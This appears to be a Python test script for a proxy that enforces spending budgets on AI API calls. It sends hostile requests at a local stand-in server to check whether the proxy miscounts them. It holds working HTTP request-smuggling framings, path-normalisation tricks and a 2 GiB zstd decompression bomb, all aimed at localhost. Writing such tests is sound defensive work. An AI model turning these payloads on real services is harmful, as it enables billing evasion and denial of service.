"""End-to-end tests of the spend boundary (#374/#385) against requests a hostile program could send.
Starts the stand-in upstream (Go net/http) and the boundary, sends raw bytes over TLS, and reports
what the boundary counted (its record) against what the upstream served (its log).
usage: python3 e2e.py <case> [...]"""
import json, os, socket, ssl, subprocess, sys, time, zlib, signal

S = os.environ.get("SB", "/home/user/wt/385/research/2026-11-24-spend-budgets")
T = S + "/run/tls"
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.environ.get("OUT", "/tmp/claude-0/e2e")

def start(conf):
    os.makedirs(OUT, exist_ok=True)
    for f in ("up.log", "record.jsonl"):
        try: os.remove(f"{OUT}/{f}")
        except FileNotFoundError: pass
    up = subprocess.Popen([f"{HERE}/upstream", f"{OUT}/up.log", "127.0.0.1:18443", f"{T}/up-chain.crt", f"{T}/up-leaf.key"], stderr=subprocess.DEVNULL)
    env = dict(PATH="/usr/bin:/bin", SILO_CONFIG=conf, RECORD=f"{OUT}/record.jsonl", CERT=f"{T}/silo-chain.crt", KEY=f"{T}/silo-leaf.key",
               UPSTREAM_CA=f"{T}/up-ca.crt", UPSTREAM_PORT="18443", LISTEN_PORT="14443", HOLD="0")
    bd = subprocess.Popen([os.environ.get("BOUNDARY", S + "/boundary/zig-out/bin/boundary")], env=env, stderr=open(f"{OUT}/boundary.err", "w"))
    time.sleep(0.8)
    return up, bd

def conn(host):
    ctx = ssl.create_default_context(cafile=f"{T}/silo-ca.crt")
    s = socket.create_connection(("127.0.0.2", 14443))
    return ctx.wrap_socket(s, server_hostname=host)

def recv_all(s, t=3.0):
    s.settimeout(t); out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
    except (socket.timeout, ssl.SSLError, ConnectionResetError): pass
    return out

KEY = {"api.anthropic.com": "x-api-key: sk-ant-api03-main-fake", "api.openai.com": "authorization: Bearer sk-proj-main-fake",
       "generativelanguage.googleapis.com": "x-goog-api-key: g-main-fake"}
BODY = {"api.anthropic.com": b'{"model":"claude-opus-5-5","max_tokens":16,"messages":[{"role":"user","content":"hi"}]}',
        "api.openai.com": b'{"model":"gpt-6.2-sol","max_output_tokens":16,"input":"hi"}',
        "generativelanguage.googleapis.com": b'{"contents":[{"parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":16}}'}

def call(host, target, body=None, extra=b"", head_extra=""):
    body = BODY[host] if body is None else body
    s = conn(host)
    req = (f"POST {target} HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\ncontent-type: application/json\r\n{head_extra}"
           f"content-length: {len(body)}\r\nconnection: close\r\n\r\n").encode() + body + extra
    s.sendall(req)
    r = recv_all(s); s.close()
    return r.split(b"\r\n", 1)[0].decode(errors="replace")

def lines(p):
    try: return [json.loads(l) for l in open(p)]
    except FileNotFoundError: return []

def report():
    rec = lines(f"{OUT}/record.jsonl"); up = lines(f"{OUT}/up.log")
    counted = [r for r in rec if r.get("kind") in ("settled", "call-settled") or "cost" in r]
    served = [u for u in up if u["clean"] in ("/v1/messages", "/v1/responses") or ":generateContent" in u["clean"]]
    return rec, up, served

def case_paths():
    """Spellings of the model endpoints that the real hosts routed to their model API (README),
    sent to a computer whose budget is $50; each call costs $24 at the upstream's counts."""
    up, bd = start(f"{HERE}/budget.json")
    try:
        plan = [("api.anthropic.com", t) for t in ["/v1/messages"] * 3 + ["https://api.anthropic.com/v1/messages", "//v1/messages", "/v1//messages", "/v1/./messages", "/v1/x/../messages", "/%761/messages"]]
        plan += [("api.openai.com", t) for t in ["//v1/responses", "/v1/./responses"]]
        plan += [("generativelanguage.googleapis.com", "/v1beta/models/gemini-3.1-pro-preview:generateContent/")]
        for host, t in plan:
            print(f"{host:36} {t:45} -> {call(host, t)}")
        time.sleep(0.5)
    finally:
        bd.kill(); up.kill()
    rec, ups, served = report()
    print(f"\nupstream served {len(served)} model calls ({len(served)*24} dollars at its counts) under a $50 budget")
    kinds = {}
    for r in rec: kinds[r.get('kind')] = kinds.get(r.get('kind'), 0) + 1
    print("boundary record kinds:", kinds)


def smuggle(host, front_head_extra, carrier_body, label):
    """One TLS connection: a request to a path the boundary does not count, framed so that the
    boundary reads `carrier_body` as its body, then a plain GET that collects the next answer."""
    s = conn(host)
    head = (f"POST /v1/nonexistent HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\n").encode() + front_head_extra
    s.sendall(head + carrier_body)
    time.sleep(0.5)
    s.sendall(f"GET /v1/models HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\n\r\n".encode())
    r = recv_all(s, 2.0); s.close()
    return [l.decode(errors="replace") for l in r.split(b"\r\n") if l.startswith(b"HTTP/1.1") or b'"usage"' in l]

def inner(host):
    b = BODY[host]
    return (f"POST /v1/messages HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\ncontent-type: application/json\r\n"
            f"content-length: {len(b)}\r\n\r\n").encode() + b

def case_smuggle():
    """Framing the boundary and the host read differently: a model call hidden in the body of a
    request the boundary does not count."""
    up, bd = start(f"{HERE}/budget.json")
    host = "api.anthropic.com"
    try:
        inn = inner(host)
        # 1. bare LF: the boundary reads one header line; Go reads two (Transfer-Encoding: chunked).
        body = b"0\r\n\r\n" + inn
        print("bare-LF TE  :", smuggle(host, f"x-pad: a\ntransfer-encoding: chunked\r\ncontent-length: {len(body)}\r\n\r\n".encode(), body, "lf"))
        # 2. obs-fold: the boundary reads a Content-Length; Go folds the line into x-pad's value.
        print("obs-fold CL :", smuggle(host, f"x-pad: a\r\n content-length: {len(inn)}\r\n\r\n".encode(), inn, "fold"))
        # 3. space before the colon: the boundary trims it; Go must refuse it (RFC 9112 5.1).
        print("space colon :", smuggle(host, f"content-length : {len(inn)}\r\n\r\n".encode(), inn, "sp"))
        # 4. underscores in Content-Length: Zig's parseInt reads 1_0 as 10.
        cl = str(len(inn)); cl_us = cl[0] + "_" + cl[1:]
        print("CL with _   :", smuggle(host, f"content-length: {cl_us}\r\n\r\n".encode(), inn, "us"))
        time.sleep(0.5)
    finally:
        bd.kill(); up.kill()
    rec, ups, served = report()
    print(f"upstream served {len(served)} model calls; boundary counted {sum(1 for r in rec if r.get('kind')=='call')}")
    for u in ups: print("  upstream:", u["method"], u["target"], u.get("te"), u["cl"])


def hwm(pid):
    for l in open(f"/proc/{pid}/status"):
        if l.startswith("VmHWM"): return int(l.split()[1]) // 1024
    return -1

def case_memory():
    """What one request costs the boundary in memory: a large body, and a small compressed one."""
    import zstandard, gzip
    up, bd = start(f"{HERE}/budget.json")
    host = "api.anthropic.com"
    try:
        print(f"boundary at rest: {hwm(bd.pid)} MiB peak")
        # A compressed body: 2 GiB of spaces after a JSON prefix, as zstd.
        dec = 2 << 30
        cctx = zstandard.ZstdCompressor(level=19)
        w = cctx.compressobj()
        bomb = w.compress(b'{"model":"claude-opus-5-5","max_tokens":1,"messages":[],"x":"')
        chunk = b" " * (1 << 24)
        for _ in range(dec // len(chunk)): bomb += w.compress(chunk)
        bomb += w.compress(b'"}') + w.flush()
        s = conn(host)
        s.sendall((f"POST /v1/messages HTTP/1.1\r\nhost: {host}\r\n{KEY[host]}\r\ncontent-type: application/json\r\n"
                   f"content-encoding: zstd\r\ncontent-length: {len(bomb)}\r\nconnection: close\r\n\r\n").encode() + bomb)
        r = recv_all(s, 20); s.close()
        print(f"zstd body of {len(bomb)/1024:.0f} KiB decoding to {dec>>20} MiB: answer {r.split(b'\r\n',1)[0]!r}; boundary peak {hwm(bd.pid)} MiB")
        alive = bd.poll() is None
        print("boundary still running:", alive)
    finally:
        bd.kill(); up.kill()

if __name__ == "__main__":
    for c in sys.argv[1:]: globals()["case_" + c]()
